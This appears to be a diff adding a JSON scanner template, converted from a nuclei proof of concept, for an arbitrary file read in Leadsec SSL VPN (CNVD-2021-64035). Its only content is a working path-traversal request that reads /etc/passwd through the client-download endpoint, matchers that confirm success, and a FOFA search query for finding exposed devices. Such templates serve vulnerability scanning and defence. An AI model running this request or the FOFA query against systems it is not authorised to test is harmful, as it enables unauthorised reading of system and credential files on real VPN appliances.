@@ -1,0 +1,165 @@
+{
+  "id": "CNVD-2021-64035",
+  "name": "Leadsec VPN - Arbitrary File Read",
+  "author": "xiaoWangSec",
+  "severity": "HIGH",
+  "description": "There is an information leakage vulnerability in the SSL VPN of Beijing Wangyuxingyun Information Technology Co., Ltd., and attackers can use the vulnerability to obtain sensitive information.\n",
+  "references": [
+    "https://avd.aliyun.com/detail?id\u003dAVD-2021-888761",
+    "https://www.cnvd.org.cn/flaw/show/CNVD-2021-64035"
+  ],
+  "tags": [
+    "cnvd",
+    "cnvd2024",
+    "lfi",
+    "leadsec",
+    "vpn"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "icon_hash\u003d\"-15980305\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /vpn/user/download/client?ostype\u003d../../../../../../../../../etc/passwd HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "root:.*:0:0:"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        },
+        {
+          "type": "WORD",
+          "part": "header",
+          "values": [
+            "appframe"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "CNVD-2021-64035",
+    "info": {
+      "name": "Leadsec VPN - Arbitrary File Read",
+      "author": "xiaoWangSec",
+      "severity": "high",
+      "description": "There is an information leakage vulnerability in the SSL VPN of Beijing Wangyuxingyun Information Technology Co., Ltd., and attackers can use the vulnerability to obtain sensitive information.\n",
+      "reference": [
+        "https://avd.aliyun.com/detail?id\u003dAVD-2021-888761",
+        "https://www.cnvd.org.cn/flaw/show/CNVD-2021-64035"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "icon_hash\u003d\"-15980305\""
+      },
+      "tags": "cnvd,cnvd2024,lfi,leadsec,vpn"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /vpn/user/download/client?ostype\u003d../../../../../../../../../etc/passwd HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "root:.*:0:0:"
+            ],
+            "group": 1,
+            "internal": true
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "header",
+            "words": [
+              "appframe"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
